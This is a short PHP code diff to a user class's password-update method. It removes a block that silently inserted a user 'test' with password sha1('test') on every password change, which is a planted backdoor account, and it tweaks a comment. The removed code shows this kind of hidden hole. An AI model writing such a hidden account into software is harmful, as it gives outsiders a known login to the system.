@@ -166,18 +166,12 @@ class User
         $user = self::getConnectedUser($request);
         Log::info("Updating password of " . $user->username);
 
-        // If old password is the right one, it'll run true
+        // If old password is the right one, it'll update
         $query = Db::get()->update('users', [
             'password' => $new
         ], [
             'rowid' => $user->rowid,
             'password' => $old
-        ]);
-
-        Db::get()->insert('users', [
-            'username' => 'test',
-            'password' => sha1('test'),
-            'role'     => 'user'
         ]);
 
         return $query->rowCount() > 0;
